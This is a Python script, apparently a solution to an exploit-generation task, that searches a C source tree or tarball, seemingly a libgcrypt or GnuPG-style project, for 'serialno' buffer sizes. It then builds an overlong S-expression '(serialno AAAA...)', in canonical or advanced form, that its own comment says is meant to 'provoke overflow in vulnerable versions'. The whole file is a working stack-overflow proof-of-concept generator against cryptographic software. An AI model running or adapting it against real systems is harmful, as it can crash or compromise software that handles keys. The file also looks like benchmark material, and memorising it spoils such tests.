import os
import re
import tarfile
from collections import Counter
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    low = fn.lower()
                    if not any(low.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".cxx", ".inc", ".am", ".ac", ".in", ".txt", ".md", ".m4", ".sh", ".py", ".texi")):
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        text = data.decode("latin-1", errors="ignore")
                    yield (p, text)
            return

        if not os.path.exists(src_path):
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        name = m.name
                        low = name.lower()
                        if not any(low.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".cxx", ".inc", ".am", ".ac", ".in", ".txt", ".md", ".m4", ".sh", ".py", ".texi")):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        try:
                            text = data.decode("utf-8", errors="ignore")
                        except Exception:
                            text = data.decode("latin-1", errors="ignore")
                        yield (name, text)
            except Exception:
                return
        else:
            try:
                with open(src_path, "rb") as f:
                    data = f.read(2_000_000)
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    text = data.decode("latin-1", errors="ignore")
                yield (src_path, text)
            except Exception:
                return

    def _analyze(self, src_path: str) -> Tuple[bool, int]:
        uses_canon = False
        candidates: List[int] = []

        re_decl_serialno = re.compile(
            r"\b(?:unsigned\s+)?(?:char|uint8_t|u8|byte)\s+serialno\s*\[\s*(\d+)\s*\]",
            re.IGNORECASE,
        )
        re_decl_anyserial = re.compile(
            r"\b(?:unsigned\s+)?(?:char|uint8_t|u8|byte)\s+\w*serial\w*\s*\[\s*(\d+)\s*\]",
            re.IGNORECASE,
        )
        re_def_serial = re.compile(
            r"^\s*#\s*define\s+\w*SERIAL\w*\s+(\d+)\b",
            re.IGNORECASE | re.MULTILINE,
        )
        re_enum_serial = re.compile(
            r"\bSERIAL\w*\s*=\s*(\d+)\b",
            re.IGNORECASE,
        )

        for _, text in self._iter_source_texts(src_path):
            if not uses_canon:
                if ("gcry_sexp_sscan" in text) or ("GCRYSEXP_FMT_CANON" in text) or ("sexp_sscan" in text):
                    uses_canon = True

            for m in re_decl_serialno.finditer(text):
                try:
                    candidates.append(int(m.group(1)))
                except Exception:
                    pass

            if "serial" in text.lower():
                for m in re_def_serial.finditer(text):
                    try:
                        candidates.append(int(m.group(1)))
                    except Exception:
                        pass
                for m in re_enum_serial.finditer(text):
                    try:
                        candidates.append(int(m.group(1)))
                    except Exception:
                        pass

            if ("s2k" in text.lower()) and ("serial" in text.lower()):
                for m in re_decl_anyserial.finditer(text):
                    try:
                        candidates.append(int(m.group(1)))
                    except Exception:
                        pass

        # Choose a likely stack buffer size; bias toward small common sizes.
        filt = [c for c in candidates if 8 <= c <= 96]
        if filt:
            cnt = Counter(filt)
            likely = cnt.most_common(1)[0][0]
        else:
            likely = 16

        # Make it exceed the likely size to provoke overflow in vulnerable versions.
        payload_len = likely + 1
        if payload_len < 17:
            payload_len = 17
        if payload_len > 200:
            payload_len = 200

        return uses_canon, payload_len

    def solve(self, src_path: str) -> bytes:
        uses_canon, payload_len = self._analyze(src_path)
        payload = b"A" * payload_len

        if uses_canon:
            # Canonical S-expression: (8:serialnoN:AAAA...)
            return b"(" + b"8:serialno" + str(payload_len).encode("ascii") + b":" + payload + b")"
        else:
            # Advanced S-expression: (serialno AAAA...)
            return b"(serialno " + payload + b")"